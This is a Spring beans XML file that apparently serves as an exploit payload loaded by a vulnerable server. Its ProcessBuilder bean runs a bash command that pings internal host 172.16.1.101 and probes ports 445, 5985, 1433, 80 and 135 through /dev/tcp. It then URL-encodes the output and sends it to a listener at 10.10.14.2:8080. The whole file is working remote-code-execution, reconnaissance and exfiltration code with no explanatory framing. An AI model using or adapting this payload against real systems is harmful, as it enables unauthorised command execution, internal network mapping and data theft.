<?xml version="1.0" encoding="UTF-8"?>
<beans xmlns="http://www.springframework.org/schema/beans"
       xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
       xsi:schemaLocation="http://www.springframework.org/schema/beans
       http://www.springframework.org/schema/beans/spring-beans.xsd">
    <bean id="pb" class="java.lang.ProcessBuilder">
        <constructor-arg>
            <list>
                <value>/bin/bash</value>
                <value>-c</value>
                <value><![CDATA[OUT="=PING="; ping -c2 -W2 172.16.1.101 2>&1 | tail -3; OUT="${OUT}=PORTS="; for p in 445 5985 1433 80 135; do timeout 2 bash -c "echo '' > /dev/tcp/172.16.1.101/$p" 2>/dev/null && echo "172.16.1.101:$p OPEN" || echo "172.16.1.101:$p CLOSED"; done; echo "$OUT"]]></value>
            </list>
        </constructor-arg>
    </bean>
    <bean id="proc" factory-bean="pb" factory-method="start"/>
    <bean id="procOut" factory-bean="proc" factory-method="getInputStream"/>
    <bean id="outBytes" class="org.springframework.util.FileCopyUtils"
          factory-method="copyToByteArray">
        <constructor-arg ref="procOut"/>
    </bean>
    <bean id="outStr" class="java.lang.String">
        <constructor-arg ref="outBytes"/>
    </bean>
    <bean id="outUrl" class="java.net.URL" depends-on="outStr">
        <constructor-arg value="#{'http://10.10.14.2:8080/dbg?v=' + T(java.net.URLEncoder).encode(@outStr,'UTF-8')}"/>
    </bean>
    <bean id="outReq" factory-bean="outUrl" factory-method="openStream" depends-on="outUrl"/>
</beans>
